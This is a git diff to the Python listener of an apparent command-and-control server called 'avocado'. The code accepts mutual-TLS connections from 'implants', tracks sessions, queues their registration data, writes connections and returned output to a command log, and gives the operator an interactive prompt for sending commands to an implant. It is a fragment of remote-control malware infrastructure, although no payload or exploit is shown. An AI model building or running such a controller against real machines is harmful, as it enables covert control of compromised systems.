@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 
+import logging
 import socket
 import ssl
 import threading
 import uuid
+from queue import Queue
 
 
 # A thread safe dict of sessions and their ids
@@ -37,7 +39,7 @@ class Sessions:
 
 
 class Listener:
-    def __init__(self):
+    def __init__(self, requestq: Queue):
         self.sessions = Sessions()
 
         certfile = "../certs/server/avocado-server.c2.pem"
@@ -54,7 +56,8 @@ class Listener:
         # Create a secure socket wrapped in mTLS
         ssock = self.mkssock(ctx)
         # start accepting connections
-        threading.Thread(target=self.accept, args=(ssock,)).start()
+        t = threading.Thread(target=self.accept, args=(ssock, requestq))
+        t.start()
 
     # Create a secure socket
     def mkssock(self, ctx: ssl.SSLContext) -> ssl.SSLSocket:
@@ -65,19 +68,26 @@ class Listener:
             return ctx.wrap_socket(s, server_side=True)
 
     # Accept connections from implants
-    def accept(self, ssock: ssl.SSLSocket):
+    def accept(self, ssock: ssl.SSLSocket, requestq: Queue):
         while True:
             conn, addr = ssock.accept()
             # conn.verify_client_post_handshake()
+
+            # Send the registration to the handler
+            data = conn.recv(1024)
+            requestq.put((data, addr))
+
+            # Add the session
             id = self.sessions.add(conn, addr)
-            # TODO: remove this print statement, send this to the log
-            print(f"Accepted connection from {addr} | {id}")
+
+            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
+            logging.info(f"Accepted connection from {addr} | {id}")
 
 
 # Send data to implant
 def session(conn: ssl.SSLContext):
     while True:
-        userin = input("> ")
+        userin = input("[session] > ")
         if userin == "exit":
             break
 
@@ -86,4 +96,6 @@ def session(conn: ssl.SSLContext):
         if not data:
             break
         else:
+            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
+            logging.info(data.decode("utf-8"))
             print(data.decode("utf-8"))
